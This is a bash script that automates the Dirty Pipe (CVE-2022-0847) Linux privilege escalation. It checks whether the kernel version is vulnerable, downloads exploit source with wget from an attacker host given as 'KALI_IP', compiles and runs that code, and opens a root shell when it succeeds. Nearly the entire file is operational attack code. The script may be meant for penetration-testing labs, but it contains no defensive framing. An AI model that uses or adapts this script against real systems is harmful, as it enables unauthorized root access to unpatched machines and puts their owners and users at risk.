#!/bin/bash

# ------------------------------------------------------------------
# CVE-2022-0847 — Dirty Pipe LPE
# Based on: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
# Expects: exploit-1.c hosted at http://KALI_IP:PORT/dirtypipe/exploit-1.c
# ------------------------------------------------------------------

KALI_IP=""
KALI_PORT="80"
EXPLOIT_PATH="dirtypipe/exploit-1.c"

# Parse args
while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            KALI_IP="$2"
            shift 2
            ;;
        --port)
            KALI_PORT="$2"
            shift 2
            ;;
        *)
            echo "[-] Unknown argument: $1"
            exit 1
            ;;
    esac
done

if [ -z "$KALI_IP" ]; then
    echo "Usage: $0 --ip <KALI_IP> [--port <PORT>]"
    exit 1
fi

echo "[*] Using attacker server: $KALI_IP:$KALI_PORT"
echo "[*] Fetching exploit from: /$EXPLOIT_PATH"

# Step 1: Kernel version check
KERNEL=$(uname -r)
ver_major=$(echo "$KERNEL" | cut -d. -f1)
ver_minor=$(echo "$KERNEL" | cut -d. -f2)
ver_patch=$(echo "$KERNEL" | cut -d. -f3 | cut -d- -f1)

if [ "$ver_major" -ne 5 ] || [ "$ver_minor" -lt 8 ]; then
    echo "[-] DirtyPipe only affects Linux 5.8+ kernels"
    exit 2
fi

if [ "$ver_major" -eq 5 ] && [ "$ver_minor" -eq 10 ] && [ "$ver_patch" -ge 102 ]; then
    echo "[-] Kernel 5.10.102+ is patched — not exploitable"
    exit 2
fi

if [ "$ver_major" -eq 5 ] && [ "$ver_minor" -eq 15 ] && [ "$ver_patch" -ge 25 ]; then
    echo "[-] Kernel 5.15.25+ is patched — not exploitable"
    exit 2
fi

echo "[+] Kernel version appears potentially vulnerable"

# Step 2: Find compiler
COMPILERS=("gcc" "gcc-10" "gcc-9" "clang")
COMPILER_BIN=""
for compiler in "${COMPILERS[@]}"; do
    if command -v "$compiler" &>/dev/null; then
        COMPILER_BIN="$compiler"
        break
    fi
done

if [ -z "$COMPILER_BIN" ]; then
    echo "[-] No compiler found"
    exit 1
fi

echo "[+] Using compiler: $COMPILER_BIN"

# Step 3: Download and compile
cd /tmp || exit 1
wget http://$KALI_IP:$KALI_PORT/$EXPLOIT_PATH -O exploit-1.c || { echo "[-] Failed to download exploit"; exit 1; }

chmod +x exploit-1.c
$COMPILER_BIN exploit-1.c -o exploit-1 || { echo "[-] Compilation failed"; exit 1; }
chmod +x exploit-1

# Step 4: Execute
echo "[*] Running DirtyPipe exploit..."
./exploit-1

# Step 5: Check result
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Exploit succeeded — UID 0!"
    /bin/bash
else
    echo "[-] Exploit failed — still UID $(id -u)"
    exit 1
fi
